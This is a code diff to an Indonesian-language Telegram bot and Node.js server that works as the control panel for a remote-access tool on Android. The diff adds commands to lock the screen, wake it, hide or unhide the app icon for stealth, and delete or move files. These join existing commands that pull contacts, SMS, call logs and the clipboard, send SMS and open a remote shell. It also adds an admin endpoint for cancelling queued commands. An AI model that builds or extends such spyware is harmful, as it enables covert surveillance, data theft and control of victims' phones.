@@ -356,7 +356,9 @@ Format Eksekusi Manual:
 • <b>get_device_info</b>: Spesifikasi fisik.
 • <b>get_battery</b>: Status baterai.
 • <b>set_volume</b>: Metrik audio.
-• <b>hide_app</b>: Sembunyikan ikon.
+• <b>hide_app</b> / <b>unhide_app</b>: Kamuflase ikon.
+• <b>lock_screen</b>: Kunci layar perangkat.
+• <b>screen_on</b>: Hidupkan layar paksa.
 
 🛠️ <b>Hardware & Lingkungan</b>
 • <b>vibrate</b> / <b>torch</b> / <b>sensors</b>
@@ -368,8 +370,9 @@ Format Eksekusi Manual:
 
 🗂️ <b>Manajemen Data (I/O)</b>
 • <b>contacts</b> / <b>sms_list</b> / <b>get_call_logs</b>
-• <b>sms_send</b> / <b>clipboard</b> / <b>get_installed_apps</b>
+• <b>sms_send</b> / <b>clipboard</b> / <b>app_list</b>
 • <b>ls</b> / <b>upload</b> / <b>download</b> / <b>shell</b>
+• <b>rm</b> / <b>mv</b> / <b>find</b>
 
 📱 <b>Notifikasi & Layar</b>
 • <b>show_toast</b> / <b>notify</b> / <b>open_url</b> / <b>set_wallpaper</b>
@@ -472,7 +475,8 @@ Format Eksekusi Manual:
                 [{ text: '🗣 TTS', callback_data: `runcmd:${devId}:tts` }, { text: '🔔 Notify', callback_data: `runcmd:${devId}:notify` }, { text: '💬 Toast', callback_data: `runcmd:${devId}:show_toast` }],
                 [{ text: '🌐 Buka URL', callback_data: `runcmd:${devId}:open_url` }, { text: '🖼 Wallpaper', callback_data: `runcmd:${devId}:set_wallpaper` }, { text: '🎵 Sound', callback_data: `runcmd:${devId}:play_sound` }],
                 [{ text: '📻 Volume', callback_data: `runcmd:${devId}:set_volume` }, { text: '📋 Clipboard', callback_data: `runcmd:${devId}:clipboard` }, { text: '📶 WiFi', callback_data: `runcmd:${devId}:wifi_scan` }],
-                [{ text: '📦 Daftar App', callback_data: `runcmd:${devId}:get_installed_apps` }, { text: '⚙️ Sensor', callback_data: `runcmd:${devId}:sensors` }, { text: '🚨 Alarm', callback_data: `runcmd:${devId}:play_alarm`, style: 'danger' }],
+                [{ text: '📦 Daftar App', callback_data: `runcmd:${devId}:app_list` }, { text: '⚙️ Sensor', callback_data: `runcmd:${devId}:sensors` }, { text: '🚨 Alarm', callback_data: `runcmd:${devId}:play_alarm`, style: 'danger' }],
+                [{ text: '🔐 Lock', callback_data: `runcmd:${devId}:lock_screen`, style: 'danger' }, { text: '💡 Wake', callback_data: `runcmd:${devId}:screen_on`, style: 'danger' }],
                 [{ text: '👻 Hide Stealth', callback_data: `runcmd:${devId}:hide_app`, style: 'danger' }, { text: '💻 Shell', callback_data: `runcmd:${devId}:shell`, style: 'danger' }],
                 [{ text: '🏠 Kembali ke Utama', callback_data: `select_dev:${devId}`, style: 'success' }]
             ];
@@ -1001,6 +1005,26 @@ app.post('/admin/api/command', async (req, res) => {
         const currentMode = device?.polling_mode || 'normal';
         await db.run('INSERT INTO commands (id, device_id, command, text, status, polling_mode) VALUES (?, ?, ?, ?, ?, ?)', [cmdId, device_id, command, text || '', 'pending', currentMode]);
         res.json({ status: 'success', command_id: cmdId });
+    } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+app.delete('/admin/api/command/:id', async (req, res) => {
+    try {
+        if (!verifyAdmin(req)) return res.status(403).json({ error: 'Forbidden' });
+        const { id } = req.params;
+        // Hanya hapus jika status masih pending atau ubah status ke cancelled
+        const cmd = await db.get('SELECT status FROM commands WHERE id = ?', [id]);
+        if (!cmd) return res.status(404).json({ error: 'Command not found' });
+        
+        if (cmd.status === 'pending') {
+            await db.run('DELETE FROM commands WHERE id = ?', [id]);
+            res.json({ status: 'success', message: 'Command cancelled and deleted' });
+        } else if (cmd.status === 'sent') {
+            await db.run('UPDATE commands SET status = ? WHERE id = ?', ['cancelled', id]);
+            res.json({ status: 'success', message: 'Command marked as cancelled' });
+        } else {
+            res.status(400).json({ error: 'Cannot cancel command with status: ' + cmd.status });
+        }
     } catch (e) { res.status(500).json({ error: e.message }); }
 });
 const verifyAdmin = (req) => req.cookies.admin_auth === ADMIN_PASSWORD;
